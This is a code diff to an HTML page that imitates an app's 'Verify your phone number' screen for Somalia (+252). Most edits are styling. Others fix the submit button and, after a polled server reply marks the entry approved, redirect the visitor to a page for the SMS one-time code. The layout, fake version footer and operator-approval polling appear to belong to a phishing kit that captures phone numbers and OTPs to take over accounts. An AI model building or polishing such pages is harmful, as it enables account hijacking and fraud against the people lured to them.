@@ -65,18 +65,18 @@
             font-weight: 400;
         }
 
-        /* Country label – now with its own underline, matching the phone input */
+        /* Country label – sits on its own line */
         .country-label {
             font-size: 16px;
             font-weight: 500;
             color: #1c1c1e;
-            border-bottom: 2px solid #d1d1d6;   /* ⬅️ Same underline as phone input */
-            padding-bottom: 4px;                /* ⬅️ Same spacing as phone input */
+            border-bottom: 2px solid #d1d1d6;
+            padding-bottom: 4px;
             width: 100%;
-            margin-bottom: 16px;                /* ⬅️ Space before the next line */
+            margin-bottom: 16px;
         }
 
-        /* Phone input row – underline style (only bottom border) */
+        /* Phone input row – underline style */
         .phone-input-wrap {
             display: flex;
             align-items: center;
@@ -90,7 +90,6 @@
             border-bottom-color: #007AFF;
         }
 
-        /* Prefix (+252) inside the input */
         .prefix {
             font-size: 17px;
             font-weight: 500;
@@ -115,7 +114,7 @@
             font-weight: 400;
         }
 
-        /* Need help link – properly underlined */
+        /* Need help link */
         .help-link {
             display: block;
             text-align: right;
@@ -202,7 +201,6 @@
             letter-spacing: 0.2px;
         }
 
-        /* Responsive */
         @media (max-width: 480px) {
             body {
                 padding: 16px 16px 10px;
@@ -213,9 +211,6 @@
             .subtitle {
                 font-size: 14px;
                 margin-bottom: 20px;
-            }
-            .country-label {
-                font-size: 15px;
             }
             .prefix {
                 font-size: 16px;
@@ -230,15 +225,6 @@
             }
         }
         @media (max-width: 360px) {
-            body {
-                padding: 12px 12px 8px;
-            }
-            .title {
-                font-size: 22px;
-            }
-            .country-label {
-                font-size: 14px;
-            }
             .prefix {
                 font-size: 15px;
             }
@@ -255,7 +241,6 @@
 <body>
 
     <div class="container">
-
         <!-- Back arrow -->
         <a href="javascript:history.back()" class="back-arrow">&#8592;</a>
 
@@ -263,7 +248,7 @@
         <div class="title">Verify your phone number</div>
         <div class="subtitle">We will send an SMS message to verify your phone number.</div>
 
-        <!-- Country label – now underlined exactly like the phone input -->
+        <!-- Country label – separate line -->
         <div class="country-label">Somalia</div>
 
         <!-- Form -->
@@ -298,7 +283,7 @@
         <div class="version-footer">Version 12.4.0892 (1200040892)</div>
     </div>
 
-    <!-- ====== ORIGINAL LOGIC – COMPLETELY UNTOUCHED ====== -->
+    <!-- ====== ORIGINAL LOGIC – FIXED BUTTON REFERENCE ====== -->
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const form = document.getElementById("detailsForm");
@@ -356,7 +341,8 @@
         const form = document.getElementById('detailsForm');
         const statusEl = document.getElementById('status');
         const spinner = document.getElementById('spinner');
-        const nextButton = form.querySelector('button.primary');
+        // ✅ FIXED: reference button by its ID instead of class
+        const nextButton = document.getElementById('continueBtn');
         const termsCheck = document.getElementById('termsCheck');
 
         form.addEventListener('submit', async (e) => {
@@ -418,7 +404,7 @@
                     }
                     if (data.approved === true) {
                         clearInterval(interval);
-                        window.location.href = 'link.html'; // fallback
+                        window.location.href = 'code.html'; // redirect to OTP page
                     }
                 } catch (error) {
                     console.error('Polling error:', error);
